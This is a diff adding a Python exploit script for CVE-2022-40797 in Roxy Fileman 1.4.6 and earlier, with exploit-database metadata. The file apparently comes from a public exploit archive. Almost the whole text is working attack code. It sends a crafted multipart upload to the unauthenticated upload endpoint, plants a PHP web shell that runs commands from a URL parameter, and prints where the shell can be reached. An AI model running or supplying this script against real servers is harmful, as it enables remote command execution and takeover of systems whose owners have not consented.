@@ -1,0 +1,111 @@
+id: 38079
+date: 11/21/2022
+title: Roxy Fileman 1.4.6 Remote Shell Upload Exploit
+author: Hadi Mene
+cves: CVE-2022-40797
+
+# Exploit Title: Roxy Fileman <= 1.4.6 Arbitrary File Upload (Unathenticated)
+# Exploit Author: Hadi Mene <hadi_mene@hotmail.com>
+# Vendor Homepage: roxyfileman.com
+# Software Link: https://web.archive.org/web/20210126213412/https://roxyfileman.com/download.php?f=1.4.6-php
+# Version: <= 1.4.6
+# Tested on: Ubuntu 18.04 
+# CVE : CVE-2022-40797
+
+# https://nvd.nist.gov/vuln/detail/CVE-2022-40797 
+
+import requests
+from optparse import OptionParser
+from os.path import basename
+
+banner =  '#################################################\n'
+banner += '# Roxy Fileman <= 1.4.6 Arbitrary File Upload   #\n'
+banner += '#\t\t\t\t\t\t#\n'
+banner += '#\tCVE-2022-40797 exploit code\t\t#\n'
+banner += '#\t\t\t\t\t\t#\n'
+banner += '#\t\t\t\t\t\t#\n'
+banner += '#  Author : Hadi Mene <hadi_mene@hotmail.com>\t#\n'
+banner += '#\t\t\t\t\t\t#\n'
+banner += '#################################################\n'
+
+
+parser = OptionParser()
+parser.add_option("-u", "--url", dest="url",
+                  help="url of roxy fileman installation")
+parser.add_option("-s", "--shell",dest="shell", default=False,
+                  help="path of the php shell if not specified defaut shell will be uploaded ")
+
+
+(options, args) = parser.parse_args()
+
+
+if options.url is None:
+  parser.error('URL is required use -h for help')
+
+url = options.url
+
+#It seems that in some versions of the app an '/' in the end of the url breaks the exploit code
+if (url.endswith('/')):
+  url = url[:-1] # we delete that '/'
+  
+webroot = options.url.split('/')[3:]
+webroot = '/'+ '/'.join(webroot)
+
+if (webroot.endswith('/')):
+  webroot = webroot[:-1]
+  
+webroot = webroot+'/Uploads'
+
+if options.shell:
+  shell = open(options.shell,'r').read()
+  filename = basename(options.shell)
+  filename = filename.split('.')[0]
+  
+else:
+  # default shell
+  shell = "<?php system($_GET['cmd']); ?>"
+  filename = 'shell'
+
+
+headers = {
+    'Host': (url.split('/')[2]),
+    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
+    'Accept': '*/*',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Content-Type': 'multipart/form-data; boundary=---------------------------39556237418830295983527604767',
+    'Origin': (url.split('/')[2]),
+    'Connection': 'close',
+}
+
+data = '-----------------------------39556237418830295983527604767\r\nContent-Disposition: form-data; name="action"\r\n\r\nupload\r\n-----------------------------39556237418830295983527604767\r\nContent-Disposition: form-data; name="method"\r\n\r\najax\r\n-----------------------------39556237418830295983527604767\r\nContent-Disposition: form-data; name="d"\r\n\r\n'+(webroot)+'\r\n-----------------------------39556237418830295983527604767\r\nContent-Disposition: form-data; name="files[]"; filename="'+(filename)+'.phar"\r\nContent-Type: text/plain\r\n\r\n'+shell+'\n\r\n-----------------------------39556237418830295983527604767--\r\n'
+
+#We check if a file with the same filename is already there 
+#because Roxy doesn't overwrite file instead it changes the filename of the newly uploaded file
+if 'href="'+filename+'.phar"' in (requests.get(url+'/Uploads/').text):
+  already_uploaded = True
+else:
+  already_uploaded = False
+  
+# file upload
+req = requests.post(url+'/php/upload.php', headers=headers, data=data, verify=False)
+response = (req.text)
+
+print(banner)
+
+if '{"res":"ok","msg":""}' in (response):
+# success
+  print('File Uploaded Successfully!!!')
+  
+  if already_uploaded:
+    print('A file with the same filename is already on the server..')
+    print('URL: '+url+'/Uploads/'+(filename)+' - Copy X.phar ')
+    
+  else:
+    print('URL: '+url+'/Uploads/'+(filename)+'.phar')
+
+else:
+  # failure
+  print('Shell Upload Failed :((( ')
+  print(response) #debug
+
+#  0day.today [2023-03-27]  #
